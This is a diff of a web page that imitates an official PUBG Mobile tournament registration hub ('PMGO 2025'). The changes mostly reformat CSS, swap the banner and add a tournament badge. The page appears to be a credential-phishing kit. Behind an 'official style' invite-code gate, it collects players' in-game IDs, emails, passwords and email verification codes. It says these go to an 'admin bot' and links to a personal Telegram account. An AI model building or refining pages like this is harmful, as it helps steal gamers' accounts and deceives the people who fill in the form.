@@ -51,381 +51,124 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        a {
-            color: inherit;
-            text-decoration: none;
-        }
+        a { color: inherit; text-decoration: none; }
+        img { display: block; max-width: 100%; }
 
-        img {
-            display: block;
-            max-width: 100%;
-        }
-
-        .page {
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .inner {
-            width: min(1320px, 100% - 40px);
-            margin: 0 auto;
-        }
+        .page { min-height: 100vh; display: flex; flex-direction: column; }
+        .inner { width: min(1320px, 100% - 40px); margin: 0 auto; }
 
         /* HEADER */
-
         .header-wrap {
-            position: sticky;
-            top: 0;
-            z-index: 50;
-            backdrop-filter: blur(18px);
-            background: radial-gradient(circle at top,
-                rgba(0,0,0,0.88),
-                rgba(2,8,20,0.98));
+            position: sticky; top: 0; z-index: 50; backdrop-filter: blur(18px);
+            background: radial-gradient(circle at top, rgba(0,0,0,0.88), rgba(2,8,20,0.98));
             border-bottom: 1px solid rgba(255,255,255,0.06);
         }
-
-        .header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 24px;
-            padding: 10px 0 8px;
-        }
-
-        .logo-combo {
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .wb_element.wb_element_shape {
-            width: 34px;
-            height: 34px;
-            flex-shrink: 0;
-        }
-
+        .header { display: flex; align-items: center; justify-content: space-between; gap: 24px; padding: 10px 0 8px; }
+        .logo-combo { display: inline-flex; align-items: center; gap: 10px; }
+        .wb_element.wb_element_shape { width: 34px; height: 34px; flex-shrink: 0; }
         .wb_element.wb_element_shape .wb_shp {
-            width: 100%;
-            height: 100%;
-            border-radius: 12px;
-            position: relative;
-            overflow: hidden;
-            background:
-                radial-gradient(circle at 30% 0, rgba(255,184,0,0.35), transparent),
-                #040810;
-            box-shadow:
-                0 0 0 1px rgba(255,184,0,0.22),
-                0 0 18px rgba(255,184,0,0.45);
+            width: 100%; height: 100%; border-radius: 12px; position: relative; overflow: hidden;
+            background: radial-gradient(circle at 30% 0, rgba(255,184,0,0.35), transparent), #040810;
+            box-shadow: 0 0 0 1px rgba(255,184,0,0.22), 0 0 18px rgba(255,184,0,0.45);
         }
-
         .wb_element.wb_element_shape .wb_shp::after {
-            content: "";
-            position: absolute;
-            inset: 4px;
-            background:
-                url("/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png")
-                center center / contain no-repeat;
+            content: ""; position: absolute; inset: 4px;
+            background: url("/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png") center center / contain no-repeat;
             filter: drop-shadow(0 1px 3px rgba(0,0,0,0.9));
         }
+        .logo-text-block { display: flex; flex-direction: column; line-height: 1.05; }
+        .logo-text-block .top-line { display: flex; gap: 4px; font-weight: 800; font-size: 14px; letter-spacing: 0.08em; color: var(--accent); }
+        .logo-text-block .sub-line { font-size: 8px; letter-spacing: 0.16em; text-transform: uppercase; color: #9ca3af; }
 
-        .logo-text-block {
-            display: flex;
-            flex-direction: column;
-            line-height: 1.05;
-        }
-
-        .logo-text-block .top-line {
-            display: flex;
-            gap: 4px;
-            font-weight: 800;
-            font-size: 14px;
-            letter-spacing: 0.08em;
-            color: var(--accent);
-        }
-
-        .logo-text-block .sub-line {
-            font-size: 8px;
-            letter-spacing: 0.16em;
-            text-transform: uppercase;
-            color: #9ca3af;
-        }
-
-        .nav {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            font-size: 9px;
-            text-transform: uppercase;
-            letter-spacing: 0.14em;
-            color: var(--text-muted);
-        }
-
-        .nav a {
-            padding: 6px 10px;
-            border-radius: var(--radius-full);
-            border: 1px solid transparent;
-            transition: all var(--transition-fast);
-        }
-
-        .nav a:hover {
-            color: var(--accent);
-            border-color: var(--accent-soft);
-            background: rgba(255,184,0,0.06);
-        }
-
-        .nav a.nav-primary {
-            color: var(--accent);
-            border-color: var(--accent);
-            background: rgba(255,184,0,0.08);
-            box-shadow: 0 0 14px rgba(255,184,0,0.35);
-        }
-
+        .nav { display: flex; flex-wrap: wrap; gap: 10px; font-size: 9px; text-transform: uppercase; letter-spacing: 0.14em; color: var(--text-muted); }
+        .nav a { padding: 6px 10px; border-radius: var(--radius-full); border: 1px solid transparent; transition: all var(--transition-fast); }
+        .nav a:hover { color: var(--accent); border-color: var(--accent-soft); background: rgba(255,184,0,0.06); }
+        .nav a.nav-primary { color: var(--accent); border-color: var(--accent); background: rgba(255,184,0,0.08); box-shadow: 0 0 14px rgba(255,184,0,0.35); }
         .nav a.nav-soon {
-            color: var(--accent-green);
-            border-color: rgba(34,197,94,0.9);
-            background:
-                radial-gradient(circle at top, var(--accent-green-soft), transparent),
-                rgba(3,7,18,0.98);
-            box-shadow: 0 0 16px rgba(34,197,94,0.45);
-            font-weight: 700;
+            color: var(--accent-green); border-color: rgba(34,197,94,0.9);
+            background: radial-gradient(circle at top, var(--accent-green-soft), transparent), rgba(3,7,18,0.98);
+            box-shadow: 0 0 16px rgba(34,197,94,0.45); font-weight: 700;
         }
-
         .nav a.nav-soon:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 0 22px rgba(34,197,94,0.65);
-            background: linear-gradient(90deg, rgba(22,163,74,1), rgba(22,163,74,0.92));
-            color: #020817;
+            transform: translateY(-1px); box-shadow: 0 0 22px rgba(34,197,94,0.65);
+            background: linear-gradient(90deg, rgba(22,163,74,1), rgba(22,163,74,0.92)); color: #020817;
         }
 
         /* HERO: MAIN TOURNAMENT BANNER */
-
-        .hero {
-            padding: 18px 0 4px;
-        }
-
+        .hero { padding: 18px 0 4px; }
         .soon-hero-wrap {
-            position: relative;
-            border-radius: 26px;
-            overflow: hidden;
-            box-shadow: var(--shadow-soft);
-            background: #020814;
+            position: relative; border-radius: 26px; overflow: hidden; box-shadow: var(--shadow-soft); background: #020814;
         }
-
-        .soon-hero-img {
-            width: 100%;
-            display: block;
-        }
-
+        .soon-hero-img { width: 100%; display: block; }
         .soon-hero-overlay {
-            position: absolute;
-            left: 18px;
-            bottom: 16px;
-            padding: 8px 10px;
-            border-radius: 18px;
+            position: absolute; left: 18px; bottom: 16px; padding: 8px 10px; border-radius: 18px;
             background: radial-gradient(circle at top left, rgba(0,0,0,0.98), rgba(0,0,0,0.9));
-            display: inline-flex;
-            flex-direction: column;
-            gap: 3px;
+            display: inline-flex; flex-direction: column; gap: 3px;
         }
-
         .soon-label {
-            display: inline-flex;
-            align-items: center;
-            gap: 7px;
-            padding: 4px 9px;
-            border-radius: var(--radius-full);
-            background: rgba(0,0,0,0.96);
-            border: 1px solid rgba(255,184,0,0.26);
-            font-size: 8px;
-            letter-spacing: 0.16em;
-            text-transform: uppercase;
-            color: var(--accent);
+            display: inline-flex; align-items: center; gap: 7px; padding: 4px 9px; border-radius: var(--radius-full);
+            background: rgba(0,0,0,0.96); border: 1px solid rgba(255,184,0,0.26); font-size: 8px; letter-spacing: 0.16em; text-transform: uppercase; color: var(--accent);
         }
+        .soon-label span.dot { width: 6px; height: 6px; border-radius: 999px; background: var(--accent); box-shadow: 0 0 8px rgba(255,184,0,0.9); }
+        .soon-hero-title { font-size: 16px; font-weight: 800; letter-spacing: 0.16em; text-transform: uppercase; color: #ffffff; }
+        .soon-hero-sub { font-size: 8px; letter-spacing: 0.12em; text-transform: uppercase; color: #e5e7eb; opacity: 0.9; }
 
-        .soon-label span.dot {
-            width: 6px;
-            height: 6px;
-            border-radius: 999px;
-            background: var(--accent);
-            box-shadow: 0 0 8px rgba(255,184,0,0.9);
+        /* NEW: TOURNAMENT ICON UNDER BANNER */
+        .tournament-icon{
+            display:flex; align-items:center; gap:12px; padding:10px 2px 8px;
         }
-
-        .soon-hero-title {
-            font-size: 16px;
-            font-weight: 800;
-            letter-spacing: 0.16em;
-            text-transform: uppercase;
-            color: #ffffff;
+        .tournament-icon .badge{
+            width:64px; height:64px; border-radius:20px; overflow:hidden;
+            background:#0f172a; border:1px solid rgba(255,255,255,0.08); box-shadow: var(--shadow-soft);
+            flex:0 0 auto;
         }
-
-        .soon-hero-sub {
-            font-size: 8px;
-            letter-spacing: 0.12em;
-            text-transform: uppercase;
-            color: #e5e7eb;
-            opacity: 0.9;
-        }
+        .tournament-icon .badge img{width:100%; height:100%; object-fit:cover}
+        .tournament-icon .meta{display:flex; flex-direction:column; gap:3px}
+        .tournament-icon .meta .name{font-size:13px; text-transform:uppercase; letter-spacing:.18em}
+        .tournament-icon .meta .sub{font-size:8px; color:var(--text-muted); letter-spacing:.12em}
 
         /* TOURNAMENT DESCRIPTION UNDER BANNER */
-
-        .tournament-section {
-            padding: 8px 0 10px;
-        }
-
+        .tournament-section { padding: 8px 0 10px; }
         .tournament-card {
-            padding: 14px 14px 12px;
-            border-radius: var(--radius-xl);
-            background: var(--bg-card);
-            border: 1px solid rgba(255,255,255,0.08);
-            box-shadow: var(--shadow-soft);
+            padding: 14px 14px 12px; border-radius: var(--radius-xl);
+            background: var(--bg-card); border: 1px solid rgba(255,255,255,0.08); box-shadow: var(--shadow-soft);
         }
-
-        .tournament-title {
-            font-size: 13px;
-            text-transform: uppercase;
-            letter-spacing: 0.18em;
-            margin-bottom: 6px;
-        }
-
-        .tournament-text {
-            font-size: 8.5px;
-            color: var(--text-soft);
-            line-height: 1.7;
-            margin-bottom: 10px;
-        }
-
-        .tournament-points {
-            margin: 0 0 9px;
-            padding-left: 14px;
-            font-size: 8px;
-            color: var(--text-soft);
-            line-height: 1.6;
-        }
-
+        .tournament-title { font-size: 13px; text-transform: uppercase; letter-spacing: 0.18em; margin-bottom: 6px; }
+        .tournament-text { font-size: 8.5px; color: var(--text-soft); line-height: 1.7; margin-bottom: 10px; }
+        .tournament-points { margin: 0 0 9px; padding-left: 14px; font-size: 8px; color: var(--text-soft); line-height: 1.6; }
         .btn-sm {
-            padding: 7px 12px;
-            border-radius: var(--radius-full);
-            border: 1px solid rgba(255,184,0,0.82);
-            background: rgba(7,11,20,0.98);
-            font-size: 7.5px;
-            text-transform: uppercase;
-            letter-spacing: 0.16em;
-            color: var(--accent);
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-            white-space: nowrap;
+            padding: 7px 12px; border-radius: var(--radius-full); border: 1px solid rgba(255,184,0,0.82);
+            background: rgba(7,11,20,0.98); font-size: 7.5px; text-transform: uppercase; letter-spacing: 0.16em; color: var(--accent);
+            cursor: pointer; transition: all var(--transition-fast); display: inline-flex; align-items: center; gap: 5px; white-space: nowrap;
         }
-
-        .btn-sm:hover {
-            background: linear-gradient(90deg, var(--accent-alt), var(--accent));
-            color: #000;
-            box-shadow: 0 10px 20px rgba(0,0,0,1);
-        }
+        .btn-sm:hover { background: linear-gradient(90deg, var(--accent-alt), var(--accent)); color: #000; box-shadow: 0 10px 20px rgba(0,0,0,1); }
 
         /* SECTIONS / FORMS */
-
-        .section {
-            padding: 14px 0 20px;
-        }
-
-        .section-title {
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 0.18em;
-            margin-bottom: 7px;
-        }
-
-        .section-title .bar {
-            display: inline-block;
-            width: 28px;
-            height: 2px;
-            background: var(--accent);
-            margin-right: 7px;
-            border-radius: 999px;
-            vertical-align: middle;
-        }
-
-        .section-sub {
-            font-size: 8.5px;
-            color: var(--text-muted);
-            max-width: 520px;
-            margin-bottom: 12px;
-        }
+        .section { padding: 14px 0 20px; }
+        .section-title { font-size: 12px; text-transform: uppercase; letter-spacing: 0.18em; margin-bottom: 7px; }
+        .section-title .bar { display: inline-block; width: 28px; height: 2px; background: var(--accent); margin-right: 7px; border-radius: 999px; vertical-align: middle; }
+        .section-sub { font-size: 8.5px; color: var(--text-muted); max-width: 520px; margin-bottom: 12px; }
 
         .card {
-            padding: 14px 14px 12px;
-            border-radius: var(--radius-xl);
-            background: var(--bg-card);
-            border: 1px solid rgba(255,255,255,0.06);
-            box-shadow: var(--shadow-soft);
+            padding: 14px 14px 12px; border-radius: var(--radius-xl);
+            background: var(--bg-card); border: 1px solid rgba(255,255,255,0.06); box-shadow: var(--shadow-soft);
         }
-
-        .code-form-row,
-        .field-row {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 9px;
-            align-items: center;
-            margin-bottom: 9px;
-        }
-
-        .label {
-            font-size: 7px;
-            text-transform: uppercase;
-            letter-spacing: 0.16em;
-            color: var(--text-muted);
-            margin-bottom: 2px;
-        }
-
-        .input-wrap {
-            flex: 1;
-            min-width: 140px;
-        }
+        .code-form-row, .field-row { display: flex; flex-wrap: wrap; gap: 9px; align-items: center; margin-bottom: 9px; }
+        .label { font-size: 7px; text-transform: uppercase; letter-spacing: 0.16em; color: var(--text-muted); margin-bottom: 2px; }
+        .input-wrap { flex: 1; min-width: 140px; }
 
         input {
-            width: 100%;
-            padding: 7px 9px;
-            border-radius: 14px;
-            border: 1px solid rgba(148,163,253,0.12);
-            background: rgba(4,7,16,0.98);
-            color: var(--text-soft);
-            font-size: 9px;
-            outline: none;
-            transition: all var(--transition-fast);
+            width: 100%; padding: 7px 9px; border-radius: 14px; border: 1px solid rgba(148,163,253,0.12);
+            background: rgba(4,7,16,0.98); color: var(--text-soft); font-size: 9px; outline: none; transition: all var(--transition-fast);
         }
+        input::placeholder { color: rgba(148,163,253,0.45); }
+        input:focus { border-color: var(--accent); box-shadow: 0 0 10px rgba(255,184,0,0.22); }
 
-        input::placeholder {
-            color: rgba(148,163,253,0.45);
-        }
+        .note { font-size: 7px; color: var(--text-muted); margin-top: 3px; }
+        .status { margin-top: 5px; font-size: 8px; }
+        .status.ok { color: #22c55e; } .status.err { color: #f97316; }
 
-        input:focus {
-            border-color: var(--accent);
-            box-shadow: 0 0 10px rgba(255,184,0,0.22);
-        }
-
-        .note {
-            font-size: 7px;
-            color: var(--text-muted);
-            margin-top: 3px;
-        }
-
-        .status {
-            margin-top: 5px;
-            font-size: 8px;
-        }
-
-        .status.ok { color: #22c55e; }
-        .status.err { color: #f97316; }
-
-        .two-cols {
-            display: grid;
-            grid-template-columns: repeat(2, minmax(0,1fr));
-            gap: 8px;
-        }
+        .two-cols { display: grid; grid-template-columns: repeat(2, minmax(0,1fr)); gap: 8px; }
 
         @media (max-width: 768px) {
             .two-cols { grid-template-columns: 1fr; }
@@ -436,133 +179,50 @@
             .tournament-title { font-size: 11px; }
 
             .mobile-bottom-nav {
-                position: fixed;
-                left: 0; right: 0; bottom: 0;
-                z-index: 110;
-                padding: 6px 10px 8px;
-                background: radial-gradient(circle at top, rgba(0,0,0,0.9), rgba(0,0,0,1));
-                display: flex;
-                justify-content: space-between;
-                gap: 6px;
-                backdrop-filter: blur(16px);
+                position: fixed; left: 0; right: 0; bottom: 0; z-index: 110;
+                padding: 6px 10px 8px; background: radial-gradient(circle at top, rgba(0,0,0,0.9), rgba(0,0,0,1));
+                display: flex; justify-content: space-between; gap: 6px; backdrop-filter: blur(16px);
                 border-top: 1px solid rgba(255,255,255,0.1);
             }
 
             .mobile-tab {
-                flex: 1;
-                padding: 5px 4px 4px;
-                border-radius: 16px;
-                background: rgba(8,12,24,0.98);
-                border: 1px solid rgba(75,85,99,0.6);
-                font-size: 7px;
-                color: var(--text-muted);
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-                gap: 2px;
-                text-transform: uppercase;
-                letter-spacing: 0.08em;
+                flex: 1; padding: 5px 4px 4px; border-radius: 16px; background: rgba(8,12,24,0.98);
+                border: 1px solid rgba(75,85,99,0.6); font-size: 7px; color: var(--text-muted);
+                display: flex; flex-direction: column; align-items: center; gap: 2px; text-transform: uppercase; letter-spacing: 0.08em;
             }
 
             .mobile-tab span.icon { font-size: 10px; }
-
-            .mobile-tab.active,
-            .mobile-tab:hover {
-                border-color: var(--accent);
-                color: var(--accent);
-                box-shadow: 0 0 14px rgba(0,0,0,1);
-            }
+            .mobile-tab.active, .mobile-tab:hover { border-color: var(--accent); color: var(--accent); box-shadow: 0 0 14px rgba(0,0,0,1); }
         }
 
-        .submit-wrap {
-            margin-top: 9px;
-            display: flex;
-            justify-content: flex-end;
-        }
-
+        .submit-wrap { margin-top: 9px; display: flex; justify-content: flex-end; }
         .submit-btn {
-            padding: 8px 18px;
-            border-radius: var(--radius-full);
-            border: 0;
-            background: linear-gradient(90deg, var(--accent-alt), var(--accent));
-            color: #000;
-            font-size: 8px;
-            font-weight: 700;
-            letter-spacing: 0.18em;
-            text-transform: uppercase;
-            cursor: pointer;
-            box-shadow: 0 10px 24px rgba(0,0,0,1);
-            display: inline-flex;
-            align-items: center;
-            gap: 7px;
+            padding: 8px 18px; border-radius: var(--radius-full); border: 0;
+            background: linear-gradient(90deg, var(--accent-alt), var(--accent)); color: #000; font-size: 8px; font-weight: 700;
+            letter-spacing: 0.18em; text-transform: uppercase; cursor: pointer; box-shadow: 0 10px 24px rgba(0,0,0,1);
+            display: inline-flex; align-items: center; gap: 7px;
         }
-
-        .submit-btn span.icon {
-            width: 12px;
-            height: 12px;
-            border-radius: 999px;
-            background: #000;
-            color: var(--accent);
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 8px;
-        }
-
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 16px 30px rgba(0,0,0,1);
-        }
+        .submit-btn span.icon { width: 12px; height: 12px; border-radius: 999px; background: #000; color: var(--accent);
+            display: inline-flex; align-items: center; justify-content: center; font-size: 8px; }
+        .submit-btn:hover { transform: translateY(-2px); box-shadow: 0 16px 30px rgba(0,0,0,1); }
 
         .footer {
-            margin-top: 18px;
-            padding: 12px 0 18px;
-            font-size: 8px;
-            color: var(--text-muted);
-            text-align: center;
-            border-top: 1px solid rgba(255,255,255,0.06);
-            background: radial-gradient(circle at top, rgba(255,184,0,0.03), transparent);
+            margin-top: 18px; padding: 12px 0 18px; font-size: 8px; color: var(--text-muted); text-align: center;
+            border-top: 1px solid rgba(255,255,255,0.06); background: radial-gradient(circle at top, rgba(255,184,0,0.03), transparent);
         }
 
         /* FLOATING TELEGRAM BUTTON */
-
         .tg-float {
-            position: fixed;
-            right: 18px;
-            bottom: 72px;
-            width: 42px;
-            height: 42px;
-            border-radius: 50%;
-            background: radial-gradient(circle at 30% 0, rgba(255,255,255,0.16), transparent),
-                        #0f172a;
-            box-shadow: 0 10px 24px rgba(0,0,0,0.9);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            border: 1px solid rgba(255,255,255,0.16);
-            z-index: 120;
-            transition: all var(--transition-fast);
+            position: fixed; right: 18px; bottom: 72px; width: 42px; height: 42px; border-radius: 50%;
+            background: radial-gradient(circle at 30% 0, rgba(255,255,255,0.16), transparent), #0f172a;
+            box-shadow: 0 10px 24px rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center;
+            cursor: pointer; border: 1px solid rgba(255,255,255,0.16); z-index: 120; transition: all var(--transition-fast);
         }
-
-        .tg-float:hover {
-            transform: translateY(-3px) scale(1.03);
-            box-shadow: 0 16px 34px rgba(0,0,0,0.95);
-            border-color: var(--accent);
-        }
-
-        .tg-float svg {
-            width: 20px;
-            height: 20px;
-            fill: #39A9FF;
-        }
+        .tg-float:hover { transform: translateY(-3px) scale(1.03); box-shadow: 0 16px 34px rgba(0,0,0,0.95); border-color: var(--accent); }
+        .tg-float svg { width: 20px; height: 20px; fill: #39A9FF; }
 
         /* SUCCESS ICON */
-
-        .success-envelope {
-            font-size: 26px;
-            margin-bottom: 4px;
-        }
+        .success-envelope { font-size: 26px; margin-bottom: 4px; }
     </style>
 </head>
 <body>
@@ -572,15 +232,9 @@
     <div class="header-wrap">
         <div class="inner header">
             <div class="logo-combo">
-                <div class="wb_element wb_element_shape" data-plugin="Shape">
-                    <div class="wb_shp"></div>
-                </div>
+                <div class="wb_element wb_element_shape" data-plugin="Shape"><div class="wb_shp"></div></div>
                 <div class="logo-text-block">
-                    <div class="top-line">
-                        <span>ESPORT</span>
-                        <span>PUBG</span>
-                        <span>MOBILE</span>
-                    </div>
+                    <div class="top-line"><span>ESPORT</span><span>PUBG</span><span>MOBILE</span></div>
                     <div class="sub-line">REGISTRATION HUB</div>
                 </div>
             </div>
@@ -601,35 +255,38 @@
     <main>
         <div class="inner">
 
-            <!-- HERO: MAIN TOURNAMENT BANNER -->
+            <!-- HERO: MAIN TOURNAMENT BANNER (switched to your first banner) -->
             <section class="hero">
                 <div class="soon-hero-wrap">
                     <img
                         class="soon-hero-img"
-                        src="/data-fc00def3f4439521c571fe6835c730f6.webp"
+                        src="/172f6786de4f4d5591f3b061f472e935_fit.webp"
                         alt="PUBG MOBILE GLOBAL OPEN Banner"
                     />
                     <div class="soon-hero-overlay">
-                        <div class="soon-label">
-                            <span class="dot"></span>
-                            OFFICIAL STYLE • CLOSED ACCESS
-                        </div>
-                        <div class="soon-hero-title">
-                            PUBG MOBILE GLOBAL OPEN
-                        </div>
-                        <div class="soon-hero-sub">
-                            INVITE-ONLY GLOBAL QUALIFIER GATEWAY
-                        </div>
+                        <div class="soon-label"><span class="dot"></span>OFFICIAL STYLE • CLOSED ACCESS</div>
+                        <div class="soon-hero-title">PUBG MOBILE GLOBAL OPEN</div>
+                        <div class="soon-hero-sub">INVITE-ONLY GLOBAL QUALIFIER GATEWAY</div>
                     </div>
+                </div>
+            </section>
+
+            <!-- TOURNAMENT ICON + SHORT META under banner -->
+            <section class="tournament-icon" aria-label="Tournament identity">
+                <div class="badge">
+                    <!-- Замени на свой отдельный логотип турнира, если есть -->
+                    <img src="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" alt="Tournament Icon">
+                </div>
+                <div class="meta">
+                    <div class="name">PMGO 2025</div>
+                    <div class="sub">Elite Global Open • Closed Lobbies • Manual Verification</div>
                 </div>
             </section>
 
             <!-- DESCRIPTION UNDER BANNER + CTA TO CODE -->
             <section class="tournament-section">
                 <div class="tournament-card">
-                    <div class="tournament-title">
-                        PMGO 2025 — ELITE GLOBAL OPEN LOBBY
-                    </div>
+                    <div class="tournament-title">PMGO 2025 — ELITE GLOBAL OPEN LOBBY</div>
                     <div class="tournament-text">
                         One unified registration hub for trusted rosters, partners and talents.
                         Entry is protected by invite codes, manual verification and direct
@@ -650,9 +307,7 @@
 
             <!-- CODE CHECK -->
             <section class="section" id="code-gate">
-                <div class="section-title">
-                    <span class="bar"></span>Step 1 — Access Code Verification
-                </div>
+                <div class="section-title"><span class="bar"></span>Step 1 — Access Code Verification</div>
                 <div class="section-sub">
                     Enter your invite code. Valid codes unlock the secure registration form.
                     Codes are distributed manually via trusted channels and partners.
@@ -662,12 +317,9 @@
                     <div class="code-form-row">
                         <div class="input-wrap">
                             <div class="label">Access code</div>
-                            <input id="access-code" type="text"
-                                   placeholder="Enter your invite code (e.g. FLOW2025)" />
+                            <input id="access-code" type="text" placeholder="Enter your invite code (e.g. FLOW2025)" />
                         </div>
-                        <button id="check-code" class="btn-sm">
-                            VERIFY CODE
-                        </button>
+                        <button id="check-code" class="btn-sm">VERIFY CODE</button>
                     </div>
                     <div id="code-status" class="status"></div>
                     <div class="note">
@@ -679,9 +331,7 @@
 
             <!-- REGISTRATION FORM -->
             <section class="section" id="registration-section" style="display:none;">
-                <div class="section-title">
-                    <span class="bar"></span>Step 2 — Registration Form
-                </div>
+                <div class="section-title"><span class="bar"></span>Step 2 — Registration Form</div>
                 <div class="section-sub">
                     After submission your data appears in the admin bot with Approve / Reject buttons.
                     Until the decision you stay in the <strong>waiting lobby</strong>.
@@ -691,44 +341,36 @@
                     <div class="two-cols">
                         <div class="field-group">
                             <div class="label">Team / Player In-game ID</div>
-                            <input type="text" id="ingame-id" required
-                                   placeholder="PUBG MOBILE numeric ID" />
+                            <input type="text" id="ingame-id" required placeholder="PUBG MOBILE numeric ID" />
                         </div>
                         <div class="field-group">
                             <div class="label">Confirm In-game ID</div>
-                            <input type="text" id="ingame-id-confirm"
-                                   placeholder="Repeat your PUBG MOBILE ID" />
+                            <input type="text" id="ingame-id-confirm" placeholder="Repeat your PUBG MOBILE ID" />
                         </div>
                     </div>
 
                     <div class="two-cols">
                         <div class="field-group">
                             <div class="label">Email</div>
-                            <input type="email" id="email" required
-                                   placeholder="Your primary contact email" />
+                            <input type="email" id="email" required placeholder="Your primary contact email" />
                             <div class="note">All confirmations and decisions go here.</div>
                         </div>
                         <div class="field-group">
                             <div class="label">Password for portal</div>
-                            <input type="password" id="password" required
-                                   placeholder="Create portal password" />
+                            <input type="password" id="password" required placeholder="Create portal password" />
                         </div>
                     </div>
 
                     <div class="two-cols">
                         <div class="field-group">
                             <div class="label">Repeat password</div>
-                            <input type="password" id="password-confirm" required
-                                   placeholder="Repeat the password" />
+                            <input type="password" id="password-confirm" required placeholder="Repeat the password" />
                         </div>
                         <div class="field-group">
                             <div class="label">Email verification code</div>
                             <div class="code-form-row">
-                                <input type="text" id="email-code"
-                                       placeholder="Enter code from email (if provided)" />
-                                <button type="button" id="request-email-code" class="btn-sm">
-                                    GET CODE
-                                </button>
+                                <input type="text" id="email-code" placeholder="Enter code from email (if provided)" />
+                                <button type="button" id="request-email-code" class="btn-sm">GET CODE</button>
                             </div>
                             <div class="note">
                                 "GET CODE" sends your basic data to the admin bot.
@@ -739,8 +381,7 @@
 
                     <div class="field-row">
                         <label style="font-size:7px; color:var(--text-muted); display:flex; gap:6px; align-items:flex-start;">
-                            <input type="checkbox" id="terms"
-                                   style="width:10px; height:10px; margin-top:2px;" required />
+                            <input type="checkbox" id="terms" style="width:10px; height:10px; margin-top:2px;" required />
                             I confirm that the provided data is accurate and agree to receive
                             notifications about my application status.
                         </label>
@@ -785,26 +426,11 @@
 
 <!-- MOBILE BOTTOM NAV -->
 <div class="mobile-bottom-nav">
-    <div class="mobile-tab" data-target="/">
-        <span class="icon">🏠</span>
-        <span>Hub</span>
-    </div>
-    <div class="mobile-tab active" data-target="#code-gate">
-        <span class="icon">🎫</span>
-        <span>Code</span>
-    </div>
-    <div class="mobile-tab" data-target="#registration-section">
-        <span class="icon">📝</span>
-        <span>Form</span>
-    </div>
-    <div class="mobile-tab" data-target="#final-message">
-        <span class="icon">📩</span>
-        <span>Status</span>
-    </div>
-    <div class="mobile-tab" data-target="https://t.me/v7ck9ll">
-        <span class="icon">💬</span>
-        <span>TG</span>
-    </div>
+    <div class="mobile-tab" data-target="/"><span class="icon">🏠</span><span>Hub</span></div>
+    <div class="mobile-tab active" data-target="#code-gate"><span class="icon">🎫</span><span>Code</span></div>
+    <div class="mobile-tab" data-target="#registration-section"><span class="icon">📝</span><span>Form</span></div>
+    <div class="mobile-tab" data-target="#final-message"><span class="icon">📩</span><span>Status</span></div>
+    <div class="mobile-tab" data-target="https://t.me/v7ck9ll"><span class="icon">💬</span><span>TG</span></div>
 </div>
 
 <script>
@@ -1050,13 +676,7 @@
                 return;
             }
 
-            const formData = {
-                accessCode,
-                ingameId,
-                email,
-                password: pass,
-                emailCode
-            };
+            const formData = { accessCode, ingameId, email, password: pass, emailCode };
 
             regStatus.textContent = "Sending your application to the waiting lobby...";
             regStatus.className = "status";
